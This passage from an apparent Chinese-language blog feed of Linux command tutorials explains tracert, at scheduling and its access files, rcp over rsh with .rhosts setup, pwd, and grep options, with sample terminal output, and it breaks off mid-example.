到达目的地后该主机会送回一个「ICMP port unreachable」的消息，而当traceroute 收到这个消息时，便知道目的地已经到达了。所以traceroute 在Server端也是没有所谓的Daemon 程式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute提取发 ICMP TTL到期消息设备的IP地址并作域名解析。每次 ，Traceroute都打印出一系列数据,包括所经过的路由设备的域名及 IP地址,三个包每次来回所花时间。 windows之tracert:格式：1tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name 参数说明：1tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该诊断实用程序通过向目的地发送具有不同生存时间 (TL) 的 Internet 控制信息协议 (CMP) 回应报文，以确定至目的地的路由。路径上的每个路由器都要在转发该 ICMP 回应报文之前将其 TTL 值至少减 1，因此 TTL 是有效的跳转计数。当报文的 TTL 值减少到 0 时，路由器向源系统发回 ICMP 超时信息。通过发送 TTL 为 1 的第一个回应报文并且在随后的发送中每次将 TTL 值加 1，直到目标响应或达到最大 TTL 值，Tracert 可以确定路由。通过检查中间路由器发发回的 ICMP 超时 (ime Exceeded) 信息，可以确定路由器。注意，有些路由器“安静”地丢弃生存时间 (TLS) 过期的报文并且对 tracert 无效。 参数： -d 指定不对计算机名解析地址。 -h maximum_hops 指定查找目标的跳转的最大数目。 -jcomputer-list 指定在 computer-list 中松散源路由。 -w timeout 等待由 timeout 对每个应答指定的毫秒数。 target_name 目标计算机的名称。 实例：1234567891011121314151617181920212223242526272829C:\Users\Administrator&gt;tracert www.58.comTracing route to www.58.com [221.187.111.30]over a maximum of 30 hops: 1 1 ms 1 ms 1 ms 10.58.156.1 2 1 ms &lt;1 ms &lt;1 ms 10.10.10.1 3 1 ms 1 ms 1 ms 211.103.193.129 4 2 ms 2 ms 2 ms 10.255.109.129 5 1 ms 1 ms 3 ms 124.205.98.205 6 2 ms 2 ms 2 ms 124.205.98.253 7 2 ms 6 ms 1 ms 202.99.1.125 8 5 ms 6 ms 5 ms 118.186.0.113 9 207 ms * * 118.186.0.106 10 8 ms 6 ms 11 ms 124.238.226.201 11 6 ms 7 ms 6 ms 219.148.19.177 12 12 ms 12 ms 16 ms 219.148.18.117 13 14 ms 17 ms 16 ms 219.148.19.125 14 13 ms 13 ms 12 ms 202.97.80.113 15 * * * Request timed out. 16 12 ms 12 ms 17 ms bj141-147-82.bjtelecom.net [219.141.147.82] 17 13 ms 13 ms 12 ms 202.97.48.2 18 * * * Request timed out. 19 14 ms 14 ms 12 ms 221.187.224.85 20 15 ms 13 ms 12 ms 221.187.104.2 21 * * * Request timed out. 22 15 ms 17 ms 18 ms 221.187.111.30Trace complete.]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- at]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F51.%20Linux%20%E5%91%BD%E4%BB%A4-%20at%2F</url>
    <content type="text"><![CDATA[Linux 命令- at&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在windows系统中，windows提供了计划任务这一功能，在控制面板 -&gt; 性能与维护 -&gt; 任务计划， 它的功能就是安排自动运行的任务。 通过’添加任务计划’的一步步引导，则可建立一个定时执行的任务。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux系统中你可能已经发现了为什么系统常常会自动的进行一些任务？这些任务到底是谁在支配他们工作的？在linux系统如果你想要让自己设计的备份程序可以自动在某个时间点开始在系统底下运行，而不需要手动来启动它，又该如何处置呢？ 这些例行的工作可能又分为一次性定时工作与循环定时工作，在系统内又是哪些服务在负责？ 还有，如果你想要每年在老婆的生日前一天就发出一封信件提醒自己不要忘记，linux系统下该怎么做呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;今天我们主要学习一下一次性定时计划任务的at命令的用法！ 1．命令格式1at [参数] [时间] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一个指定的时间执行一个指定任务，只能执行一次，且需要开启atd进程（ps -ef | grep atd查看， 开启用/etc/init.d/atd start or restart； 开机即启动则需要运行 chkconfig –level 2345 atd on）。 3．命令参数 -m 当指定的任务被完成之后，将给用户发送邮件，即使没有标准输出 -I atq的别名 -d atrm的别名 -v 显示任务将被执行的时间 -c 打印任务的内容到标准输出 -V 显示版本信息 -q&lt;列队&gt; 使用指定的列队 -f&lt;文件&gt; 从指定文件读入任务而不是从标准输入读入 -t&lt;时间参数&gt; 以时间参数的形式提交要运行的任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;at允许使用一套相当复杂的指定时间的方法。他能够接受在当天的hh:mm（小时:分钟）式的时间指定。假如该时间已过去，那么就放在第二天执行。当然也能够使用midnight（深夜），noon（中午），teatime（饮茶时间，一般是下午4点）等比较模糊的 词语来指定时间。用户还能够采用12小时计时制，即在时间后面加上AM（上午）或PM（下午）来说明是上午还是下午。 也能够指定命令执行的具体日期，指定格式为month day（月 日）或mm/dd/yy（月/日/年）或dd.mm.yy（日.月.年）。指定的日期必须跟在指定时间的后面。 上面介绍的都是绝对计时法，其实还能够使用相对计时法，这对于安排不久就要执行的命令是很有好处的。指定格式为：now + count time-units ，now就是当前时间，time-units是时间单位，这里能够是minutes（分钟）、hours（小时）、days（天）、weeks（星期）。count是时间的数量，究竟是几天，还是几小时，等等。 更有一种计时方法就是直接使用today（今天）、tomorrow（明天）来指定完成命令的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;TIME：时间格式，这里可以定义出什么时候要进行 at 这项任务的时间，格式有： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04:00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在今日的 HH:MM 时刻进行，若该时刻已超过，则明天的 HH:MM 进行此任务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM YYYY-MM-DD &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04:00 2009-03-17 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;强制规定在某年某月的某一天的特殊时刻进行该项任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM[am|pm] [Month] [Date] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04pm March 17 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也是一样，强制在某年某月某日的某时刻进行该项任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM[am|pm] + number [minutes|hours|days|weeks] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; now + 5 minutes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04pm + 3 days &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就是说，在某个时间点再加几个时间后才进行该项任务。 4．使用实例实例1：三天后的下午 5 点锺执行 /bin/ls&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1at 5pm+3 days &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# at 5pm+3 daysat&gt; /bin/lsat&gt; &lt;EOT&gt;job 7 at 2013-01-08 17:00[root@localhost ~]# 实例2：明天17点钟，输出时间到指定文件内&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1at 17:20 tomorrow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# at 17:20 tomorrowat&gt; date &gt;/root/2013.log at&gt; &lt;EOT&gt;job 8 at 2013-01-06 17:20[root@localhost ~]# 实例3：计划任务设定后，在没有执行之前我们可以用atq命令来查看系统没有执行工作任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1atq &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# atq8 2013-01-06 17:20 a root7 2013-01-08 17:00 a root[root@localhost ~]# 实例4：删除已经设置的任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1atrm 7 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# atq8 2013-01-06 17:20 a root7 2013-01-08 17:00 a root[root@localhost ~]# atrm 7[root@localhost ~]# atq8 2013-01-06 17:20 a root[root@localhost ~]# 实例5：显示已经设置的任务内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1at -c 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# at -c 8#!/bin/sh# atrun uid=0 gid=0# mail root 0umask 22此处省略n个字符date &gt;/root/2013.log[root@localhost ~]# 5．atd 的启动与 at 运行的方式：1.atd 的启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要使用一次性计划任务时，我们的 Linux 系统上面必须要有负责这个计划任务的服务，那就是 atd 服务。 不过并非所有的 Linux distributions 都默认会把他打开的，所以，某些时刻我们需要手动将atd 服务激活才行。 激活的方法很简单，就是这样： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12/etc/init.d/atd start /etc/init.d/atd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost /]# /etc/init.d/atd start[root@localhost /]# /etc/init.d/atd 用法：/etc/init.d/atd &#123;start|stop|restart|condrestart|status&#125;[root@localhost /]# /etc/init.d/atd stop停止 atd：[确定][root@localhost /]# ps -ef|grep atdroot 25062 24951 0 14:53 pts/0 00:00:00 grep atd[root@localhost /]# /etc/init.d/atd start[确定]td：[确定][root@localhost /]# ps -ef|grep atdroot 25068 1 0 14:53 ? 00:00:00 /usr/sbin/atdroot 25071 24951 0 14:53 pts/0 00:00:00 grep atd[root@localhost /]# /etc/init.d/atd restart停止 atd：[确定][确定]td：[确定][root@localhost /]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/init.d/atd start 没有启动的时候，直接启动atd服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/init.d/atd restart 服务已经启动后，重启 atd 服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：配置一下启动时就启动这个服务，免得每次重新启动都得再来一次 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chkconfig atd on &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost /]# chkconfig atd on[root@localhost /]# 2. at 的运行方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;既然是计划任务，那么应该会有任务执行的方式，并且将这些任务排进行程表中。那么产生计划任务的方式是怎么进行的? 事实上，我们使用 at 这个命令来产生所要运行的计划任务，并将这个计划任务以文字档的方式写入 /var/spool/at/ 目录内，该工作便能等待 atd 这个服务的取用与运行了。就这么简单。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，并不是所有的人都可以进行 at 计划任务。为什么? 因为系统安全的原因。很多主机被所谓的攻击破解后，最常发现的就是他们的系统当中多了很多的黑客程序， 这些程序非常可能运用一些计划任务来运行或搜集你的系统运行信息,并定时的发送给黑客。 所以，除非是你认可的帐号，否则先不要让他们使用 at 命令。那怎么达到使用 at 的可控呢? &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们可以利用 /etc/at.allow 与 /etc/at.deny 这两个文件来进行 at 的使用限制。加上这两个文件后， at 的工作情况是这样的： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先找寻 /etc/at.allow 这个文件，写在这个文件中的使用者才能使用 at ，没有在这个文件中的使用者则不能使用 at (即使没有写在 at.deny 当中); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 /etc/at.allow 不存在，就寻找 /etc/at.deny 这个文件，若写在这个 at.deny 的使用者则不能使用 at ，而没有在这个 at.deny 文件中的使用者，就可以使用 at 命令了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果两个文件都不存在，那么只有 root 可以使用 at 这个命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;透过这个说明，我们知道 /etc/at.allow 是管理较为严格的方式，而 /etc/at.deny 则较为松散 (因为帐号没有在该文件中，就能够运行 at 了)。在一般的 distributions 当中，由于假设系统上的所有用户都是可信任的， 因此系统通常会保留一个空的 /etc/at.deny 文件，意思是允许所有人使用 at 命令的意思 (您可以自行检查一下该文件)。 不过，万一你不希望有某些使用者使用 at 的话，将那个使用者的帐号写入 /etc/at.deny 即可！ 一个帐号写一行。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rcp]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F61.%20Linux%20%E5%91%BD%E4%BB%A4-%20rcp%2F</url>
    <content type="text"><![CDATA[Linux 命令- rcp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rcp代表“remote file copy”（远程文件拷贝）。该命令用于在计算机之间拷贝文件。rcp命令有两种格式。第一种格式用于文件到文件的拷贝；第二种格式用于把文件或目录拷贝到另一个目录中。 1．命令格式1rcp [参数] [源文件] [目标文件] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rcp命令用在远端复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到该目录中。 3．命令参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;各选项含义： -r 递归地把源目录中的所有内容拷贝到目的目录中。要使用这个选项，目的必须是一个目录。 -p 试图保留源文件的修改时间和模式，忽略umask。 -k 请求rcp获得在指定区域内的远程主机的Kerberos 许可，而不是获得由krb_relmofhost⑶确定的远程主机区域内的远程主机的Kerberos许可。 -x 为传送的所有数据打开DES加密。这会影响响应时间和CPU利用率，但是可以提高安全性。如果在文件名中指定的路径不是完整的路径名，那么这个路径被解释为相对远程机上同名用户的主目录。如果没有给出远程用户名，就使用当前用户名。如果远程机上的路径包含特殊shell字符，需要用反斜线（\\）、双引号（”）或单引号（’）括起来，使所有的shell元字符都能被远程地解释。需要说明的是，rcp不提示输入口令，它通过rsh命令来执行拷贝。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;directory 每个文件或目录参数既可以是远程文件名也可以是本地文件名。远程文件名具有如下形式：rname@rhost：path，其中rname是远程用户名，rhost是远程计算机名，path是这个文件的路径。 4．使用实例要使用 rcp，需要具备以下条件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果系统中有 /etc/hosts 文件，系统管理员应确保该文件包含要与之进行通信的远程主机的项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/hosts 文件中有一行文字，其中包含每个远程系统的以下信息： 1internet_address official_name alias &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 19.186.10.*** webserver1.com.58.webserver &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.rhosts 文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.rhosts 文件位于远程系统的主目录下，其中包含本地系统的名称和本地登录名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，远程系统的 .rhosts 文件中的项可能是： 1webserver1 root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，webserver1 是本地系统的名称，root 是本地登录名。这样，webserver1 上的 root 即可在包含 .rhosts 文件的远程系统中来回复制文件。 配置过程:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只对root用户生效 在双方root用户根目录下建立.rhosts文件,并将双方的hostname加进去.在此之前应在双方的 /etc/hosts文件中加入对方的IP和hostname 把rsh服务启动起来,redhat默认是不启动的。方法：用执行ntsysv命令,在rsh选项前用空格键选中,确定退出。然后执行：service xinetd restart即可。 到/etc/pam.d/目录下,把rsh文件中的auth required /lib/security/pam_securetty.so一行用“#”注释掉即可。（只有注释掉这一行，才能用root用户登录） 命令使用:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件复制到远程系统要将本地系统中的文件复制到远程系统，请使用以下命令： 1rcplocal_fileremote_hostname:remote_fileEnter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，如果当前目录下没有 local_file，则除本地文件名外，还需要提供相对路径（自当前目录开始）或绝对路径名（自 / 开始）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;仅当希望将 remote_hostname 上的 remote_file 放到其他目录（远程主目录除外）下时，才需要为其指定完整的（绝对）路径。 使用实例1:将当前目录下的 test1 复制到名为 webserver1的远程系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp test1 webserver1:/home/root/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这种情况下，test1 被复制到远程子目录 test3下，名称仍为 test1 。如果仅提供了远程主机名，rcp 将把 test1 复制到远程主目录下，名称仍为 test1 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以在目的目录中包含文件名。例如，将文件复制到名为 webserver1的系统中： 1rcp test1 webserver1:/home/root/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这种情况下，将 test1 复制到远程目录root 下并将其命名为 test3。 使用实例2：从远程系统复制文件：要将远程系统中的文件复制到本地目录下&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp remote_hostname:remote_file local_fileEnter 使用实例:3:将远程系统 webserver1中的 test2 复制到当前目录：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp webserver1:/home/root/test2 .Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 (.) 是“当前目录”的简写形式。在这种情况下，远程目录中的 test2 被复制到当前目录下，名称仍为 test2 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望用新名称复制文件，请提供目标文件名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望将 test2 复制到本地系统中的其他目录下，请使用以下绝对或相对路径名： 1rcp webserver1:/home/root/test2 otherdir/ Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者，如果希望用其他文件名将文件复制到其他目录下： 1rcp webserver1:/home/root/test2 otherdir/otherfile Enter 使用实例4：将目录复制到远程系统：要将本地目录及其文件和子目录复制到远程系统，请同时使用 rcp 和 -r（递归）选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp –r local_dir remote_hostname:remote_dir Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果当前目录下没有 local_dir，则除本地目录名外，还需要提供相对路径名（自当前目录开始）或绝对路径名（自 / 顶级目录开始）。另外，如果主目录下没有 remote_dir，则 remote_dir 将需要一个相对路径（自主目录开始）或绝对路径（自 / 开始）。 使用实例5:要将名为 work 的子目录完整地复制到 webserver1远程计算机中的主目录下名为 products 的目录，请键入以下内容：1rcp –r work webserver1:/home/root/products Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此命令在 webserver1:/home/root/products 下创建名为 work 的目录及其全部内容（假定 /home/root/products 已存在于 webserver1中）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本示例假定用户处于包含 work 的本地目录下。否则，必须提供该目录的相对或绝对路径，如 /home/root/work。 使用实例6：从远程系统复制目录：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要将远程目录及其所有文件和子目录复制到本地目录，请在以下语法中使用 rcp 和 -r（递归）选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp –r remote_hostname:remote_dir local_dir Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要将名为 work 的远程目录复制到当前目录，请键入以下内容： 1rcp –r webserver1:/home/root/work .Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 (.) 表示当前目录。将在此目录下创建 work 目录。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- pwd]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F4.%20Linux%20%E5%91%BD%E4%BB%A4-pwd%2F</url>
    <content type="text"><![CDATA[Linux 命令- pwd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中用 pwd 命令来查看”当前工作目录“的完整路径。 简单得说，每当你在终端进行操作时，你都会有一个当前工作目录。 在不太确定当前位置时，就会使用pwd来判定当前目录在文件系统内的确切位置。 1．命令格式：1pwd [选项] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看”当前工作目录“的完整路径 3．常用参数： 一般情况下不带任何参数 如果目录是链接时：格式：pwd -P 显示出实际路径，而非使用连接（link）路径。 4．常用实例：实例1：用 pwd 命令查看默认工作目录的完整路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1pwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123[root@localhost ~]# pwd/root[root@localhost ~]# 实例2：使用 pwd 命令查看指定文件夹&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1pwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost ~]# cd /opt/soft/[root@localhost soft]# pwd /opt/soft[root@localhost soft]# 实例3：目录连接链接时，pwd -P 显示出实际路径，而非使用连接（link）路径；pwd显示的是连接路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1pwd -P &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost soft]# cd /etc/init.d [root@localhost init.d]# pwd/etc/init.d[root@localhost init.d]# pwd -P/etc/rc.d/init.d[root@localhost init.d]# 实例4：/bin/pwd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1/bin/pwd [选项] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选项： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-L 目录连接链接时，输出连接路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-P 输出物理路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost init.d]# /bin/pwd /etc/rc.d/init.d[root@localhost init.d]# /bin/pwd --help[root@localhost init.d]# /bin/pwd -P/etc/rc.d/init.d[root@localhost init.d]# /bin/pwd -L/etc/init.d[root@localhost init.d]# 实例5：当前目录被删除了，而pwd命令仍然显示那个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314[root@localhost init.d]# cd /opt/soft[root@localhost soft]# mkdir removed[root@localhost soft]# cd removed/[root@localhost removed]# pwd/opt/soft/removed[root@localhost removed]# rm ../removed -rf[root@localhost removed]# pwd/opt/soft/removed[root@localhost removed]# /bin/pwd/bin/pwd: couldn't find directory entry in “..” with matching i-node[root@localhost removed]# cd [root@localhost ~]# pwd/root[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- grep]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F41.%20Linux%20%E5%91%BD%E4%BB%A4-%20grep%2F</url>
    <content type="text"><![CDATA[&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;grep的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到标准输出，不影响原文件内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;grep可用于shell脚本，因为grep通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回0，如果搜索不成功，则返回1，如果搜索的文件不存在，则返回2。我们利用这些返回值就可进行一些自动化的文本处理工作。 1．命令格式1grep [option] pattern file 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于过滤/搜索的特定字符。可使用正则表达式能多种命令配合使用，使用上十分灵活。 3．命令参数 -a –text #不要忽略二进制的数据。 -A&lt;显示行数&gt; –after-context=&lt;显示行数&gt; #除了显示符合范本样式的那一列之外，并显示该行之后的内容。 -b –byte-offset #在显示符合样式的那一行之前，标示出该行第一个字符的编号。 -B&lt;显示行数&gt; –before-context=&lt;显示行数&gt; #除了显示符合样式的那一行之外，并显示该行之前的内容。 -c –count #计算符合样式的列数。 -C&lt;显示行数&gt; –context=&lt;显示行数&gt;或-&lt;显示行数&gt; #除了显示符合样式的那一行之外，并显示该行之前后的内容。 -d &lt;动作&gt; –directories=&lt;动作&gt; #当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。 -e&lt;范本样式&gt; –regexp=&lt;范本样式&gt; #指定字符串做为查找文件内容的样式。 -E –extended-regexp #将样式为延伸的普通表示法来使用。 -f&lt;规则文件&gt; –file=&lt;规则文件&gt; #指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。 -F –fixed-regexp #将样式视为固定字符串的列表。 -G –basic-regexp #将样式视为普通的表示法来使用。 -h –no-filename #在显示符合样式的那一行之前，不标示该行所属的文件名称。 -H –with-filename #在显示符合样式的那一行之前，表示该行所属的文件名称。 -i –ignore-case #忽略字符大小写的差别。 -l –file-with-matches #列出文件内容符合指定的样式的文件名称。 -L –files-without-match #列出文件内容不符合指定的样式的文件名称。 -n –line-number #在显示符合样式的那一行之前，标示出该行的列数编号。 -q –quiet或–silent #不显示任何信息。 -r –recursive #此参数的效果和指定“-d recurse”参数相同。 -s –no-messages #不显示错误信息。 -v –revert-match #显示不包含匹配文本的所有行。 -V –version #显示版本信息。 -w –word-regexp #只显示全字符合的列。 -x –line-regexp #只显示全列符合的列。 -y #此参数的效果和指定“-i”参数相同。 4．规则表达式grep的规则表达式: ^ #锚定行的开始 如：’^grep’匹配所有以grep开头的行。 $ #锚定行的结束 如：’grep$’匹配所有以grep结尾的行。 . #匹配一个非换行符的字符 如：’gr.p’匹配gr后接一个任意字符，然后是p。 * #匹配零个或多个先前字符 如：’*grep’匹配所有一个或多个空格后紧跟grep的行。 .* #一起用代表任意字符。 [] #匹配一个指定范围内的字符，如’[Gg]rep’匹配Grep和grep。 [^] #匹配一个不在指定范围内的字符，如：’[^A-FH-Z]rep’匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。 \(..\) #标记匹配字符，如’\(love\)’，love被标记为1。 \&lt; #锚定单词的开始，如:’\&lt;grep’匹配包含以grep开头的单词的行。 \&gt; #锚定单词的结束，如’grep\&gt;’匹配包含以grep结尾的单词的行。 x\{m\} #重复字符x，m次，如：’0\{5\}’匹配包含5个o的行。 x\{m,\} #重复字符x,至少m次，如：’o\{5,\}’匹配至少有5个o的行。 x\{m,n\} #重复字符x，至少m次，不多于n次，如：’o\{5,10\}’匹配5–10个o的行。 \w #匹配文字和数字字符，也就是[A-Za-z0-9]，如：’G\w*p’匹配以G后跟零个或多个文字或数字字符，然后是p。 \W #\w的反置形式，匹配一个或多个非单词字符，如点号句号等。 \b #单词锁定符，如: ‘\bgrep\b’只匹配grep。 POSIX字符:&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了在不同国家的字符编码中保持一至，POSIX(The Portable Operating System Interface)增加了特殊的字符类，如[:alnum:]是[A-Za-z0-9]的另一个写法。要把它们放到[]号内才能成为正则表达式，如[A- Za-z0-9]或[[:alnum:]]。在linux下的grep除fgrep外，都支持POSIX的字符类。 [:alnum:] #文字数字字符 [:alpha:] #文字字符 [:digit:] #数字字符 [:graph:] #非空字符（非空格、控制字符） [:lower:] #小写字符 [:cntrl:] #控制字符 [:print:] #非空字符（包括空格） [:punct:] #标点符号 [:space:] #所有空白字符（新行，空格，制表符） [:upper:] #大写字符 [:xdigit:] #十六进制数字（0-9，a-f，A-F） 5．使用实例实例1：查找指定进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef|grep svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# ps -ef|grep svnroot 4943 1 0 Dec05 ? 00:00:00 svnserve -d -r /opt/svndata/grape/root 16867 16838 0 19:53 pts/0 00:00:00 grep svn[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;第一条记录是查找出的进程；第二条结果是grep进程本身，并非真正要找的进程。 实例2：查找指定进程个数&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ps -ef|grep svn -cps -ef|grep -c svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# ps -ef|grep svn -c2[root@localhost ~]# ps -ef|grep -c svn 2[root@localhost ~]# 实例3：从文件中读取关键词进行搜索&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt | grep -f test2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test]# cat test.txt hnlinuxpeida.cnblogs.comubuntuubuntu linuxredhatRedhatlinuxmint[root@localhost test]# cat test2.txt linuxRedhat[root@localhost test]# cat test.txt | 